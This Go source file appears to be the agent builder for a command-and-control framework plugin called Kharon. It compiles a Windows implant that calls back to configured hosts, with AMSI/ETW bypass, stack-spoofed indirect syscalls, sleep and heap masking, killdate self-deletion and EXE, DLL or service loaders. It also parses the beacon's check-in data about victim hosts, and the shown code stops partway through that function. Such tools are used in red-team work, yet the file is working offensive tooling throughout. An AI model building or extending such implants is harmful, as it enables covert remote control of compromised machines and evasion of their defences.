package main

import (
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"log"
	mrand "math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"sort"
	"strconv"
	"time"

	"errors"
	"fmt"
	"math/rand"
	"strings"

	"github.com/google/uuid"

	adaptix "github.com/Adaptix-Framework/axc2"
)

type KharonConfig struct {
}

func AgentGenerateProfile(agentConfig string, listenerWM string, listenerMap map[string]any) ([]byte, error) {

	/// START CODE

	fmt.Printf("=== AgentGenerateProfile ===\n")
	fmt.Printf("agentConfig: %s\n", agentConfig)
	fmt.Printf("listenerWM: %s\n", listenerWM)

	// Print listenerMap detalhadamente
	fmt.Printf("listenerMap (%d items):\n", len(listenerMap))
	for key, value := range listenerMap {
		switch v := value.(type) {
		case string:
			fmt.Printf("  [%s] = %s\n", key, v)
		case int, int32, int64:
			fmt.Printf("  [%s] = %d\n", key, v)
		case bool:
			fmt.Printf("  [%s] = %t\n", key, v)
		case []byte:
			fmt.Printf("  [%s] = []byte (length: %d)\n", key, len(v))
		case map[string]any:
			fmt.Printf("  [%s] = map[string]any (%d items)\n", key, len(v))
		default:
			fmt.Printf("  [%s] = %v (type: %T)\n", key, v, v)
		}
	}
	fmt.Printf("============================\n")

	/// END CODE
	return nil, nil
}

type AgentConfig struct {
	Format string `json:"format"`
	Debug  bool   `json:"debug_mode"`
	Sleep  string `json:"sleep"`
	Jitter int    `json:"jitter"`

	KilldateCheck   bool   `json:"killdate_check"`
	KilldateDate    string `json:"killdate_date"`
	KilldateExit    string `json:"killdate_exit"`
	KilldateSelfDel bool   `json:"killdate_selfdel"`

	ForkPipe    string `json:"fork_pipename"`
	Spawnto     string `json:"spawnto"`
	Bypass      string `json:"bypass"`
	MaskHeap    bool   `json:"mask_heap"`
	MaskSleep   string `json:"mask_sleep"`
	BofApiProxy bool   `json:"bof_api_proxy"`
	Syscall     string `json:"syscall"`

	GuardIpAddress  string `json:"guardrails_ip"`
	GuardHostName   string `json:"guardrails_hostname"`
	GuardUserName   string `json:"guardrails_user"`
	GuardDomainName string `json:"guardrails_domain"`

	WorkingTimeCheck bool   `json:"workingtime_check"`
	WorkingTimeEnd   string `json:"workingtime_end"`
	WorkingTimeStart string `json:"workingtime_start"`
}

func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map[string]any) ([]byte, string, error) {
	fmt.Println("=== AgentGenerateBuild START ===")
	fmt.Printf("DEBUG: agentConfig length: %d bytes\n", len(agentConfig))
	fmt.Printf("DEBUG: agentProfile length: %d bytes\n", len(agentProfile))
	fmt.Printf("DEBUG: listenerMap keys: %v\n", getMapKeys(listenerMap))

	var cfg AgentConfig
	if err := json.Unmarshal([]byte(agentConfig), &cfg); err != nil {
		fmt.Printf("ERROR: Failed to parse agentConfig: %v\n", err)
		return nil, "", fmt.Errorf("failed to parse agentConfig: %v", err)
	}
	fmt.Printf("DEBUG: Config parsed successfully - Format: %s, Sleep: %s, Jitter: %d\n", cfg.Format, cfg.Sleep, cfg.Jitter)

	// Extract callbacks
	callbacks := toStringSlice(listenerMap["callback_addresses"])
	fmt.Printf("DEBUG: Initial callbacks from 'callback_addresses': %v\n", callbacks)

	if len(callbacks) == 0 {
		if hb, ok := listenerMap["host_bind"]; ok {
			callbacks = toStringSlice(hb)
			fmt.Printf("DEBUG: Fallback to 'host_bind': %v\n", callbacks)
		} else {
			fmt.Println("WARNING: No 'host_bind' found in listenerMap")
		}
	}

	hosts := []string{}
	endpoints := []string{}
	ports := []int{}
	seenE := map[string]bool{}

	fmt.Printf("DEBUG: Processing %d callback entries\n", len(callbacks))
	for i, cb := range callbacks {
		cb = strings.TrimSpace(cb)
		if cb == "" {
			fmt.Printf("DEBUG: Skipping empty callback at index %d\n", i)
			continue
		}
		fmt.Printf("DEBUG: Processing callback[%d]: %q\n", i, cb)

		entries := strings.FieldsFunc(cb, func(r rune) bool {
			return r == '\n' || r == '\r' || r == ',' || r == ';'
		})
		fmt.Printf("DEBUG: Split into %d entries: %v\n", len(entries), entries)

		for j, entry := range entries {
			entry = strings.TrimSpace(entry)
			if entry == "" {
				fmt.Printf("DEBUG: Skipping empty entry at index %d\n", j)
				continue
			}

			log.Printf("Parsing entry: %q", entry)

			host := entry
			port := 0

			// IPv6 format: [host]:port
			if strings.HasPrefix(entry, "[") {
				log.Printf("Entry appears to be IPv6-style: %q", entry)
				if idx := strings.Index(entry, "]"); idx != -1 {
					host = entry[1:idx]
					rest := strings.TrimSpace(entry[idx+1:])
					if strings.HasPrefix(rest, ":") {
						if p, err := strconv.Atoi(strings.TrimSpace(rest[1:])); err == nil {
							port = p
						} else {
							fmt.Printf("WARNING: Failed to parse port from %q: %v\n", rest, err)
						}
					}
					fmt.Printf("DEBUG: Parsed IPv6 - host: %q, port: %d\n", host, port)
				} else {
					fmt.Printf("WARNING: Malformed IPv6 address: %q\n", entry)
				}
			} else if strings.Contains(entry, ":") {
				parts := strings.SplitN(entry, ":", 2)
				host = strings.TrimSpace(parts[0])
				if p, err := strconv.Atoi(strings.TrimSpace(parts[1])); err == nil {
					port = p
				} else {
					fmt.Printf("WARNING: Failed to parse port from %q: %v\n", parts[1], err)
				}
				fmt.Printf("DEBUG: Parsed IPv4/hostname - host: %q, port: %d\n", host, port)
			} else {
				fmt.Printf("DEBUG: No port specified for entry: %q\n", entry)
			}

			if host != "" {
				hosts = append(hosts, host)
				fmt.Printf("DEBUG: Added host: %q (total: %d)\n", host, len(hosts))
			} else {
				fmt.Println("WARNING: Empty host after parsing")
			}

			if port > 0 {
				ports = append(ports, port)
				fmt.Printf("DEBUG: Added port: %d (total: %d)\n", port, len(ports))
			}
		}
	}

	// Extract endpoints
	fmt.Printf("DEBUG: Extracting endpoints from 'uri' field\n")
	uriField := listenerMap["uri"]
	fmt.Printf("DEBUG: uri field type: %T, value: %v\n", uriField, uriField)

	for i, e := range toStringSlice(uriField) {
		fmt.Printf("DEBUG: Processing uri[%d]: %q\n", i, e)
		parts := strings.Split(e, "\n")
		for j, p := range parts {
			p = strings.TrimSpace(p)
			if p == "" {
				fmt.Printf("DEBUG: Skipping empty endpoint part at index %d\n", j)
				continue
			}
			if !strings.HasPrefix(p, "/") {
				p = "/" + p
				fmt.Printf("DEBUG: Added leading slash to endpoint: %q\n", p)
			}
			if !seenE[p] {
				endpoints = append(endpoints, p)
				seenE[p] = true
				fmt.Printf("DEBUG: Added endpoint: %q (total: %d)\n", p, len(endpoints))
			} else {
				fmt.Printf("DEBUG: Skipping duplicate endpoint: %q\n", p)
			}
		}
	}

	fmt.Printf("\n→ Parsed connection details:\n")
	fmt.Printf("   Hosts: %v (%d entries)\n", hosts, len(hosts))
	fmt.Printf("   Ports: %v (%d entries)\n", ports, len(ports))
	fmt.Printf("   Endpoints: %v (%d entries)\n", endpoints, len(endpoints))

	if len(hosts) == 0 {
		fmt.Println("ERROR: No hosts parsed from callbacks!")
		return nil, "", fmt.Errorf("no hosts found in callback configuration")
	}
	if len(endpoints) == 0 {
		fmt.Println("WARNING: No endpoints found, agent may not function properly")
	}

	wd, err := os.Getwd()
	if err != nil {
		fmt.Printf("ERROR: Failed to get working directory: %v\n", err)
		panic(err)
	}
	fmt.Printf("DEBUG: Working directory: %s\n", wd)

	targetPath := filepath.Join(filepath.Dir(wd), "dist", "extenders", "agent_kharon", "src_beacon")
	fmt.Printf("DEBUG: Target path: %s\n", targetPath)

	if _, err := os.Stat(targetPath); os.IsNotExist(err) {
		fmt.Printf("ERROR: Target path does not exist: %s\n", targetPath)
		return nil, "", fmt.Errorf("target path not found: %s", targetPath)
	}

	webHostC := makeCWideList(hosts)
	webEndpointC := makeCWideList(endpoints)
	webPortsC := makeCIntList(ports)
	fmt.Printf("DEBUG: Generated C arrays - hosts: %s, endpoints: %s, ports: %s\n", webHostC, webEndpointC, webPortsC)

	// SSL configuration
	sslEnabled := false
	if s, ok := listenerMap["ssl"].(bool); ok {
		sslEnabled = s
		fmt.Printf("DEBUG: SSL from bool: %v\n", sslEnabled)
	} else if s2, ok := listenerMap["ssl"].(string); ok {
		sslEnabled = (s2 == "1" || strings.EqualFold(s2, "true"))
		fmt.Printf("DEBUG: SSL from string %q: %v\n", s2, sslEnabled)
	} else {
		fmt.Printf("DEBUG: SSL field not found or unknown type: %T\n", listenerMap["ssl"])
	}

	// Request headers - Parse and format correctly
	headersStr := ""
	if rh := listenerMap["request_headers"]; rh != nil {
		var headerLines []string

		// Handle different input types
		switch v := rh.(type) {
		case string:
			// Split on newlines to get individual headers
			lines := strings.Split(v, "\n")
			for _, line := range lines {
				line = strings.TrimSpace(line)
				if line != "" {
					headerLines = append(headerLines, line)
				}
			}
		case map[string]interface{}:
			// If it's a map, convert to header format
			for k, val := range v {
				headerLines = append(headerLines, fmt.Sprintf("%s: %s", k, val))
			}
		}

		if len(headerLines) > 0 {
			// Join with \r\n for proper HTTP headers
			headersStr = strings.Join(headerLines, "\\r\\n")
			// Escape for make/shell
			headersStr = strings.ReplaceAll(headersStr, `"`, `\"`)
			fmt.Printf("DEBUG: Request headers (processed): %s\n", headersStr)
		}
	} else {
		fmt.Println("DEBUG: No request_headers found")
	}

	// Proxy configuration - escape strings
	proxyURL := fmt.Sprint(listenerMap["proxy_url"])
	if proxyURL == "<nil>" {
		proxyURL = ""
	}
	proxyURL = strings.ReplaceAll(proxyURL, `\`, `\\`)
	proxyURL = strings.ReplaceAll(proxyURL, `"`, `\"`)

	proxyEnabled := false
	if strings.TrimSpace(proxyURL) != "" {
		proxyEnabled = true
		fmt.Printf("DEBUG: Proxy enabled with URL: %s\n", proxyURL)
	} else {
		fmt.Println("DEBUG: Proxy disabled")
	}

	proxyUser := fmt.Sprint(listenerMap["proxy_user"])
	if proxyUser == "<nil>" {
		proxyUser = ""
	}
	proxyUser = strings.ReplaceAll(proxyUser, `\`, `\\`)
	proxyUser = strings.ReplaceAll(proxyUser, `"`, `\"`)

	proxyPass := fmt.Sprint(listenerMap["proxy_pass"])
	if proxyPass == "<nil>" {
		proxyPass = ""
	}
	proxyPass = strings.ReplaceAll(proxyPass, `\`, `\\`)
	proxyPass = strings.ReplaceAll(proxyPass, `"`, `\"`)

	// User-Agent: Clean up and escape properly
	userAgent := fmt.Sprint(listenerMap["user_agent"])

	// Remove any trailing carriage returns, newlines, or whitespace
	userAgent = strings.TrimSpace(userAgent)
	userAgent = strings.Trim(userAgent, "\r\n")

	// Escape for C compiler (Makefile will add L"..." wrapper)
	userAgent = strings.ReplaceAll(userAgent, `\`, `\\`)
	userAgent = strings.ReplaceAll(userAgent, `"`, `\"`)
	fmt.Printf("DEBUG: User-Agent (cleaned): %s\n", userAgent)

	// Parse killdate
	killdateDay := 0
	killdateMonth := 0
	killdateYear := 0
	if cfg.KilldateCheck && cfg.KilldateDate != "" {
		fmt.Printf("DEBUG: Parsing killdate: %s\n", cfg.KilldateDate)
		parts := strings.Split(cfg.KilldateDate, ".")
		if len(parts) == 3 {
			if d, err := strconv.Atoi(parts[0]); err == nil {
				killdateDay = d
			} else {
				fmt.Printf("WARNING: Failed to parse killdate day: %v\n", err)
			}
			if m, err := strconv.Atoi(parts[1]); err == nil {
				killdateMonth = m
			} else {
				fmt.Printf("WARNING: Failed to parse killdate month: %v\n", err)
			}
			if y, err := strconv.Atoi(parts[2]); err == nil {
				killdateYear = y
			} else {
				fmt.Printf("WARNING: Failed to parse killdate year: %v\n", err)
			}
			fmt.Printf("DEBUG: Killdate parsed: %02d.%02d.%04d\n", killdateDay, killdateMonth, killdateYear)
		} else {
			fmt.Printf("WARNING: Invalid killdate format (expected DD.MM.YYYY): %s\n", cfg.KilldateDate)
		}
	}

	// Parse working time
	workStartHour := 0
	workStartMin := 0
	workEndHour := 0
	workEndMin := 0
	if cfg.WorkingTimeCheck {
		fmt.Println("DEBUG: Parsing working time...")
		if cfg.WorkingTimeStart != "" {
			parts := strings.Split(cfg.WorkingTimeStart, ":")
			if len(parts) == 2 {
				if h, err := strconv.Atoi(parts[0]); err == nil {
					workStartHour = h
				} else {
					fmt.Printf("WARNING: Failed to parse work start hour: %v\n", err)
				}
				if m, err := strconv.Atoi(parts[1]); err == nil {
					workStartMin = m
				} else {
					fmt.Printf("WARNING: Failed to parse work start minute: %v\n", err)
				}
				fmt.Printf("DEBUG: Work start time: %02d:%02d\n", workStartHour, workStartMin)
			} else {
				fmt.Printf("WARNING: Invalid work start time format: %s\n", cfg.WorkingTimeStart)
			}
		}
		if cfg.WorkingTimeEnd != "" {
			parts := strings.Split(cfg.WorkingTimeEnd, ":")
			if len(parts) == 2 {
				if h, err := strconv.Atoi(parts[0]); err == nil {
					workEndHour = h
				} else {
					fmt.Printf("WARNING: Failed to parse work end hour: %v\n", err)
				}
				if m, err := strconv.Atoi(parts[1]); err == nil {
					workEndMin = m
				} else {
					fmt.Printf("WARNING: Failed to parse work end minute: %v\n", err)
				}
				fmt.Printf("DEBUG: Work end time: %02d:%02d\n", workEndHour, workEndMin)
			} else {
				fmt.Printf("WARNING: Invalid work end time format: %s\n", cfg.WorkingTimeEnd)
			}
		}
	}

	khSleep := cfg.Sleep
	if khSleep == "" {
		khSleep = "3"
		fmt.Println("DEBUG: Using default sleep time: 3s")
	} else {
		khSleep = strings.TrimSuffix(khSleep, "s")
		fmt.Printf("DEBUG: Sleep time: %s\n", khSleep)
	}

	httpMethod := strings.ToUpper(fmt.Sprint(listenerMap["http_method"]))
	if httpMethod == "" || httpMethod == "<NIL>" {
		httpMethod = "POST"
		fmt.Println("DEBUG: Using default HTTP method: POST")
	} else {
		fmt.Printf("DEBUG: HTTP method: %s\n", httpMethod)
	}

	// Format HTTP method as C wide string literal
	fmt.Printf("DEBUG: Formatted WEB_METHOD: %s\n", httpMethod)

	// User-Agent: Just escape, Makefile will add L"..." wrapper
	fmt.Printf("DEBUG: User-Agent (for make): %s\n", userAgent)

	// Headers: Just escape, Makefile will add L"..." wrapper
	fmt.Printf("DEBUG: Headers (for make): %s\n", headersStr)

	// Format proxy URL - Makefile adds L"..." wrapper
	fmt.Printf("DEBUG: Proxy URL (for make): %s\n", proxyURL)

	// Format proxy credentials - Makefile adds L"..." wrapper
	fmt.Printf("DEBUG: Proxy user (for make): %s\n", proxyUser)
	fmt.Printf("DEBUG: Proxy pass (for make): %s\n", proxyPass)

	// Escape and format ForkPipe - NOTE: This one doesn't use Makefile wrapper
	forkPipe := cfg.ForkPipe
	forkPipe = strings.ReplaceAll(forkPipe, `\`, `\\`)
	forkPipe = strings.ReplaceAll(forkPipe, `"`, `\"`)
	forkPipeC := fmt.Sprintf("L\\\"%s\\\"", forkPipe)

	// Escape and format Spawnto - used with quotes in Makefile
	spawnto := cfg.Spawnto
	spawnto = strings.ReplaceAll(spawnto, `\`, `\\`)
	spawnto = strings.ReplaceAll(spawnto, `"`, `\"`)

	fmt.Printf("DEBUG: Spawnto (for make): %s\n", spawnto)

	// spawntoPath := strings.ReplaceAll(cfg.Spawnto, `\`, `\\\\`)

	makeVars := []string{
		fmt.Sprintf("WEB_HOST=%s", webHostC),
		fmt.Sprintf("WEB_PORT=%s", webPortsC),
		fmt.Sprintf("WEB_ENDPOINT=%s", webEndpointC),
		fmt.Sprintf("WEB_METHOD='%s'", httpMethod),
		fmt.Sprintf("WEB_SECURE_ENABLED=%d", boolToInt(sslEnabled)),
		fmt.Sprintf("WEB_SECURE_ENABLED=%d", boolToInt(sslEnabled)),
		fmt.Sprintf("WEB_USER_AGENT=%s", userAgent),
		fmt.Sprintf("WEB_HTTP_HEADERS=%s", headersStr),
		fmt.Sprintf("WEB_PROXY_ENABLED=%d", boolToInt(proxyEnabled)),
		fmt.Sprintf("WEB_PROXY_URL=%s", proxyURL),
		fmt.Sprintf("WEB_PROXY_USERNAME=%s", proxyUser),
		fmt.Sprintf("WEB_PROXY_PASSWORD=%s", proxyPass),

		fmt.Sprintf("KH_SLEEP_TIME=%s", khSleep),
		fmt.Sprintf("KH_JITTER=%d", cfg.Jitter),
		fmt.Sprintf("KH_AGENT_UUID=%s", uuid.New()),

		fmt.Sprintf("KH_WORKTIME_ENABLED=%d", boolToInt(cfg.WorkingTimeCheck)),
		fmt.Sprintf("KH_WORKTIME_START_HOUR=%d", workStartHour),
		fmt.Sprintf("KH_WORKTIME_START_MIN=%d", workStartMin),
		fmt.Sprintf("KH_WORKTIME_END_HOUR=%d", workEndHour),
		fmt.Sprintf("KH_WORKTIME_END_MIN=%d", workEndMin),

		fmt.Sprintf("KH_KILLDATE_ENABLED=%d", boolToInt(cfg.KilldateCheck)),
		fmt.Sprintf("KH_KILLDATE_DAY=%d", killdateDay),
		fmt.Sprintf("KH_KILLDATE_MONTH=%d", killdateMonth),
		fmt.Sprintf("KH_KILLDATE_YEAR=%d", killdateYear),
		fmt.Sprintf("KH_KILLDATE_EXIT_PROCESS=%d", boolToInt(cfg.KilldateExit == "Process")),
		fmt.Sprintf("KH_KILLDATE_SELFDEL=%d", boolToInt(cfg.KilldateSelfDel)),

		fmt.Sprintf("KH_FORK_PIPENAME=%s", forkPipeC),
		fmt.Sprintf("KH_SPAWNTO_X64=%s", spawnto),

		fmt.Sprintf("KH_BOF_HOOK_ENABLED=%d", boolToInt(cfg.BofApiProxy)),

		fmt.Sprintf("WEB_HOST_QTT=%d", len(hosts)),
		fmt.Sprintf("WEB_PORT_QTT=%d", len(ports)),
		fmt.Sprintf("WEB_ENDPOINT_QTT=%d", len(endpoints)),
	}

	// Guardrails
	if cfg.GuardUserName != "" {
		makeVars = append(makeVars, fmt.Sprintf("KH_GUARDRAILS_USER=%s", cfg.GuardUserName))
		fmt.Printf("DEBUG: Guardrail - Username: %s\n", cfg.GuardUserName)
	}
	if cfg.GuardDomainName != "" {
		makeVars = append(makeVars, fmt.Sprintf("KH_GUARDRAILS_DOMAIN=%s", cfg.GuardDomainName))
		fmt.Printf("DEBUG: Guardrail - Domain: %s\n", cfg.GuardDomainName)
	}
	if cfg.GuardHostName != "" {
		makeVars = append(makeVars, fmt.Sprintf("KH_GUARDRAILS_HOST=%s", cfg.GuardHostName))
		fmt.Printf("DEBUG: Guardrail - Hostname: %s\n", cfg.GuardHostName)
	}
	if cfg.GuardIpAddress != "" {
		makeVars = append(makeVars, fmt.Sprintf("KH_GUARDRAILS_IPADDRESS=%s", cfg.GuardIpAddress))
		fmt.Printf("DEBUG: Guardrail - IP Address: %s\n", cfg.GuardIpAddress)
	}

	// Syscall flags
	fmt.Printf("DEBUG: Syscall method: %s\n", cfg.Syscall)
	switch cfg.Syscall {
	case "Stack Spoof + Indirect":
		makeVars = append(makeVars, "KH_SYSCALL=2")
	case "Stack Spoof":
		makeVars = append(makeVars, "KH_SYSCALL=1")
	default:
		makeVars = append(makeVars, "KH_SYSCALL=0")
	}

	// AMSI + ETW bypass
	fmt.Printf("DEBUG: Bypass method: %s\n", cfg.Bypass)
	switch cfg.Bypass {
	case "AMSI":
		makeVars = append(makeVars, "KH_AMSI_ETW_BYPASS=0x700")
	case "ETW":
		makeVars = append(makeVars, "KH_AMSI_ETW_BYPASS=0x400")
	case "AMSI + ETW":
		makeVars = append(makeVars, "KH_AMSI_ETW_BYPASS=0x100")
	default:
		makeVars = append(makeVars, "KH_AMSI_ETW_BYPASS=0x000")
	}

	// Heap obfuscation
	fmt.Printf("DEBUG: Mask heap: %v\n", cfg.MaskHeap)
	if cfg.MaskHeap {
		makeVars = append(makeVars, "KH_HEAP_MASK=1")
	} else {
		makeVars = append(makeVars, "KH_HEAP_MASK=0")
	}

	// Sleep mask
	fmt.Printf("DEBUG: Sleep mask: %s\n", cfg.MaskSleep)
	switch strings.ToLower(cfg.MaskSleep) {
	case "timer":
		makeVars = append(makeVars, "KH_SLEEP_MASK=1")
	case "pooling":
		makeVars = append(makeVars, "KH_SLEEP_MASK=2")
	default:
		makeVars = append(makeVars, "KH_SLEEP_MASK=3")
	}

	debugMode := cfg.Debug
	target := "x64"
	if strings.EqualFold(cfg.Format, "x86") {
		target = "x86"
	}
	
	if debugMode {
		target = target + "-debug"
	}

	fmt.Printf("DEBUG: Build target: %s\n", target)

	fmt.Println("\n→ Make variables:")
	for _, v := range makeVars {
		fmt.Println("   ", v)
	}

	allArgs := append([]string{"-C", targetPath, target}, makeVars...)
	cmd := exec.Command("make", allArgs...)

	target = "x64"

	fmt.Printf("\nDEBUG: Running command: make %v\n", allArgs)

	var stdOut, stdErr bytes.Buffer
	cmd.Stdout = &stdOut
	cmd.Stderr = &stdErr

	fmt.Println("DEBUG: Executing make command...")
	if err := cmd.Run(); err != nil {
		fmt.Printf("ERROR: Make command failed: %v\n", err)
		fmt.Printf("STDOUT:\n%s\n", stdOut.String())
		fmt.Printf("STDERR:\n%s\n", stdErr.String())
		return nil, "", fmt.Errorf("make failed: %v\nstdout:\n%s\nstderr:\n%s", err, stdOut.String(), stdErr.String())
	}
	fmt.Println("DEBUG: Make command completed successfully")

	outputFile := filepath.Join(targetPath, "Bin", fmt.Sprintf("Kharon.%s.bin", target))
	fmt.Printf("DEBUG: Reading output file: %s\n", outputFile)

	bin, err := os.ReadFile(outputFile)
	if err != nil {
		fmt.Printf("ERROR: Failed to read output file %s: %v\n", outputFile, err)
		return nil, "", fmt.Errorf("failed to read output (%s): %v", outputFile, err)
	}
	fmt.Printf("DEBUG: Read %d bytes from output file\n", len(bin))

	outFileName := ""
	var finalBin []byte

	fmt.Printf("\nDEBUG: Processing format: %s\n", cfg.Format)

	if cfg.Format == "Exe" || cfg.Format == "Dll" || cfg.Format == "Svc" {
		fmt.Println("→ Compiling loader for format:", cfg.Format)

		loaderPath := filepath.Join(filepath.Dir(wd), "dist", "extenders", "agent_kharon", "src_loader")
		fmt.Printf("DEBUG: Loader path: %s\n", loaderPath)

		if _, err := os.Stat(loaderPath); os.IsNotExist(err) {
			fmt.Printf("ERROR: Loader path does not exist: %s\n", loaderPath)
			return nil, "", fmt.Errorf("loader path not found: %s", loaderPath)
		}

		shellcodeHeaderPath := filepath.Join(loaderPath, "Include", "Shellcode.h")
		fmt.Printf("DEBUG: Generating shellcode header at: %s\n", shellcodeHeaderPath)

		shellcodeContent := generateShellcodeHeader(bin)
		fmt.Printf("DEBUG: Generated shellcode header (%d bytes)\n", len(shellcodeContent))

		if err := os.WriteFile(shellcodeHeaderPath, []byte(shellcodeContent), 0644); err != nil {
			fmt.Printf("ERROR: Failed to write Shellcode.h: %v\n", err)
			return nil, "", fmt.Errorf("failed to write Shellcode.h: %v", err)
		}
		fmt.Println("→ Shellcode injected into:", shellcodeHeaderPath)

		var sourceFile string
		var outputName string

		switch cfg.Format {
		case "Exe":
			sourceFile = "Exe.cc"
			outputName = "Kharon.x64.exe"
		case "Dll":
			sourceFile = "Dll.cc"
			outputName = "Kharon.x64.dll"
		case "Svc":
			sourceFile = "Svc.cc"
			outputName = "Kharon.x64.svc.exe"
		}

		fmt.Printf("DEBUG: Source file: %s, Output name: %s\n", sourceFile, outputName)

		sourcePath := filepath.Join(loaderPath, "Source", "Main", sourceFile)
		outputPath := filepath.Join(loaderPath, "Bin", outputName)

		if _, err := os.Stat(sourcePath); os.IsNotExist(err) {
			fmt.Printf("ERROR: Source file does not exist: %s\n", sourcePath)
			return nil, "", fmt.Errorf("source file not found: %s", sourcePath)
		}

		binDir := filepath.Join(loaderPath, "Bin")
		if err := os.MkdirAll(binDir, 0755); err != nil {
			fmt.Printf("ERROR: Failed to create Bin directory: %v\n", err)
			return nil, "", fmt.Errorf("failed to create Bin directory: %v", err)
		}
		fmt.Printf("DEBUG: Created/verified Bin directory: %s\n", binDir)

		includeDir := filepath.Join(loaderPath, "Include")

		clangArgs := []string{
			"-target", "x86_64-w64-mingw32",
			"-I", includeDir,
			"-o", outputPath,
			sourcePath,
			"-Os",
			"-nostdlib",
			"-s",
			"-lkernel32",
			"-ladvapi32",
			"-mwindows",
		}

		if cfg.Format == "Dll" {
			clangArgs = append(clangArgs, "-shared")
			fmt.Println("DEBUG: Added -shared flag for DLL compilation")
		}

		fmt.Printf("→ Running clang++: %v\n", clangArgs)

		clangCmd := exec.Command("clang++", clangArgs...)
		clangCmd.Stdout = &stdOut
		clangCmd.Stderr = &stdErr

		fmt.Println("DEBUG: Executing clang++ command...")
		if err := clangCmd.Run(); err != nil {
			fmt.Printf("ERROR: clang++ command failed: %v\n", err)
			fmt.Printf("STDOUT:\n%s\n", stdOut.String())
			fmt.Printf("STDERR:\n%s\n", stdErr.String())
			return nil, "", fmt.Errorf("clang++ failed: %v\nstdout:\n%s\nstderr:\n%s", err, stdOut.String(), stdErr.String())
		}
		fmt.Println("DEBUG: clang++ command completed successfully")

		finalBin, err = os.ReadFile(outputPath)
		if err != nil {
			fmt.Printf("ERROR: Failed to read loader output %s: %v\n", outputPath, err)
			return nil, "", fmt.Errorf("failed to read loader output (%s): %v", outputPath, err)
		}
		fmt.Printf("DEBUG: Read %d bytes from loader output\n", len(finalBin))

		outFileName = outputName
		fmt.Println("→ Loader compiled successfully:", outputPath)
	}

	if cfg.Format == "Exe" {
		outFileName = "Kharon.x64.exe"
	} else if cfg.Format == "Dll" {
		outFileName = "Kharon.x64.dll"
	} else if cfg.Format == "Svc" {
		outFileName = "Kharon.x64.svc.exe"
	} else if cfg.Format == "Bin" {
		outFileName = "Kharon.x64.bin"
		finalBin = bin
		fmt.Println("DEBUG: Using raw binary format")
	} else {
		outFileName = fmt.Sprintf("Kharon.%s.bin", target)
		finalBin = bin
		fmt.Printf("DEBUG: Using default format with target: %s\n", target)
	}

	fmt.Println("\n✓ Build completed successfully!")
	fmt.Printf("  Output file: %s\n", outFileName)
	fmt.Printf("  Final size: %d bytes\n", len(finalBin))
	fmt.Println("=== AgentGenerateBuild END ===\n")

	return finalBin, outFileName, nil
}

func CreateAgent(initialData []byte) (adaptix.AgentData, error) {
	var agent adaptix.AgentData

	fmt.Println("=== DEBUG RAW DATA ===")
	fmt.Printf("Total bytes received: %d\n", len(initialData))
	fmt.Printf("Hex dump:\n%s", hex.Dump(initialData))
	fmt.Printf("Raw bytes: %x\n", initialData)
	fmt.Printf("As string (printable): ")
	for _, b := range initialData {
		if b >= 32 && b <= 126 {
			fmt.Printf("%c", b)
		} else {
			fmt.Printf(".")
		}
	}
	fmt.Printf("\n")
	fmt.Println("======================")

	packer := CreatePacker(initialData)

	command := packer.ParseInt8()
	fmt.Printf("Command: 0x%x\n", command)
	if command != 0xf1 {
		return agent, errors.New("error agent checkin data")
	}

	randomUUID := packer.ParsePad(36)
	agentId := fmt.Sprintf("%08x", rand.Uint32())
	fmt.Printf("Agent ID: %s\n", agentId)
	fmt.Printf("Agent Random UUID: %s\n", randomUUID)

	// if false == packer.CheckPacker([]string{"byte", "array", "array", "array", "int", "array", "int", "int", "int", "int", "int", "int",
	// 	"int", "int", "int", "int", "word", "word", "word", "array", "int", "int", "int", "int", "int", "int", "long",
	// 	"int", "int", "long", "long", "int", "int", "int", "array", "int", "array", "int", "int", "int", "int", "int", "array",
	// }) {
	// 	fmt.Printf("error agent data\n")
	// 	return agent, errors.New("error agent data")
	// }

	osArch := packer.ParseInt8()
	fmt.Printf("OS Arch: %v\n", osArch)

	usernameBytes := packer.ParseBytes()
	fmt.Printf("Username Bytes: %v\n", usernameBytes)

	computerBytes := packer.ParseString()
	fmt.Printf("Computer Bytes: %s\n", computerBytes)

	netbios := packer.ParseString()
	fmt.Printf("NETBIOS: %s\n", netbios)

	pid := packer.ParseInt32()
	fmt.Printf("PID: %v\n", pid)

	imagePathBytes := packer.ParseString()
	fmt.Printf("Image Path Bytes: %s\n", imagePathBytes)

	acp := int(packer.ParseInt32())
	fmt.Printf("ACP: %v\n", acp)

	oemcp := int(packer.ParseInt32())
	fmt.Printf("OEMCP: %v\n", oemcp)

	_ = int(packer.ParseInt32())
	_ = int(packer.ParseInt32())

	_ = int(packer.ParseInt32())
	_ = int(packer.ParseInt32())
	_ = int(packer.ParseInt32())

	_ = int(packer.ParseInt32())
	_ = int(packer.ParseInt32())
	_ = int(packer.ParseInt32())

	_ = packer.ParseInt16()
	_ = packer.ParseInt16()
	_ = packer.ParseInt16()

	commandLine := packer.ParseString()
	fmt.Printf("CommandLine: %v\n", commandLine)

	heapHandle := packer.ParseInt32()
	fmt.Printf("Heap Handle: %v\n", heapHandle)

	elevatedValue := packer.ParseInt32()
	fmt.Printf("ElevatedValue: %v\n", elevatedValue)

	jitter := packer.ParseInt32()
	fmt.Printf("Jitter: %v\n", jitter)

	sleep := packer.ParseInt32()
	fmt.Printf("Sleep(ms): %v\n", sleep)

	parentID := packer.ParseInt32()
	fmt.Printf("ParentID: %v\n", parentID)

	procArch := packer.ParseInt32()
	fmt.Printf("Process Arch: %v\n", procArch)

	baseStart := packer.ParseInt64()
	fmt.Printf("Base Start: %v\n", baseStart)

	baseLength := packer.ParseInt32()
	fmt.Printf("Base Length: %v\n", baseLength)

	tid := packer.ParseInt32()
	fmt.Printf("TID: %v\n", tid)

	// Gadgets
	for i := 0; i < 4; i++ {
		val := packer.ParseInt64()
		fmt.Printf("Gadget[%d]: %v\n", i, val)
	}

	techniqueID := packer.ParseInt32()
	fmt.Printf("TechniqueID: %v\n", techniqueID)

	parentPSID := packer.ParseInt32()
	fmt.Printf("ParentPSID: %v\n", parentPSID)

	pipe := packer.ParseInt32()
	fmt.Printf("Pipe: %v\n", pipe)

	currentDir := packer.ParseString()
	fmt.Printf("Current Dir: %v\n", currentDir)

	blockDlls := packer.ParseInt32()
	fmt.Printf("Block DLLs: %v\n", blockDlls)

	processorName := packer.ParseString()
	fmt.Printf("Processor Name: %v\n", processorName)

	totalRAM := packer.ParseInt32()
	fmt.Printf("Total RAM: %v\n", totalRAM)

	avalRAM := packer.ParseInt32()
	fmt.Printf("Available RAM: %v\n", avalRAM)

